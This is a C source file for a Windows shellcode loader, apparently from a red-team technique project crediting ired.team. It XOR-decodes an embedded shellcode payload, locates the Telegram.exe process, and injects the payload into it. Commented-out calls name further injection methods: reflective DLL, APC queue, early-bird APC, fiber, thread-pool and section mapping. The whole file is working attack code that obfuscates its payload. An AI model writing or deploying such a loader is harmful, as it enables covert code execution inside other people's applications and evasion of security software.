#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include "Techniques.h"
#include "AsmCodes.h"
#include "AsmCodesTestProcessXored.h"

#define PERFORM_DECRYPTION TRUE

//
// The techniques mentioned in this project are all derived from: https://www.ired.team
//

void decodeBuffer(unsigned char* outputBuffer, int bufferLen, unsigned char* encoded_buffer, BOOLEAN decode, unsigned char key) {


	for (int i = 0; i < bufferLen; i++) {

		if (decode)
		{
			outputBuffer[i] = (encoded_buffer[i] ^ key); // XOR operation to decode

		}
		else
		{
			outputBuffer[i] = encoded_buffer[i];

		}
	}
}

// Function to find process ID by name
DWORD GetProcessIdByName(const wchar_t* processName) {
	DWORD processId = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe32)) {
			do {
				printf("Process name: %ws\n", pe32.szExeFile);

				if (wcscmp(pe32.szExeFile, processName) == 0) {
					processId = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
	return processId;
}

void compareBuffers(const char* buffer1, const char* buffer2, size_t size) {
	for (size_t i = 0; i < size; ++i) {
		if (buffer1[i] != buffer2[i]) {
			printf("Buffers differ at offset %zu: %c (buffer1) != %c (buffer2)\n", i, buffer1[i], buffer2[i]);
		}
	}
}

int main()
{
	unsigned char key = 0x41;
	int arrayLen = sizeof(SHELLCODE);
	unsigned char* encoded_shellcode = (unsigned char*)SHELLCODE;
	UINT32 TargetProcessId = GetProcessIdByName(L"Telegram.exe");

	if (TargetProcessId == 0)
	{
		printf("process not found");
		return 0;
	}

	unsigned char* outputBuffer = (unsigned char*)malloc(arrayLen);

	if (outputBuffer == NULL) {
		fprintf(stderr, "Memory allocation failed.\n");
		exit(EXIT_FAILURE);
	}

	RtlZeroMemory(outputBuffer, arrayLen);

	// Decode the shellcode and store it in a buffer
	decodeBuffer(outputBuffer, arrayLen, encoded_shellcode, TRUE, key);

	// Now you have the decoded shellcode in the buffer
	// You can use the buffer and buffer_size as needed
	InjectShellcodeRemoteProcess(TargetProcessId, outputBuffer, arrayLen);

	// DllInjectionRemoteProcess(TargetProcessId);
	// ReflectiveDllInjection();
	// RunFromPeResources();
	// ApcQueueCodeInjection();
	// EarlyBirdApcQueueInjection();
	// ExecuteModuleShellcodeUsingFiber();
	// ModuleExecutionThroughThreadPool();
	// MapViewOfSectionCodeInjection(TargetProcessId);

	// Free the allocated buffer when done
	free(outputBuffer);

}
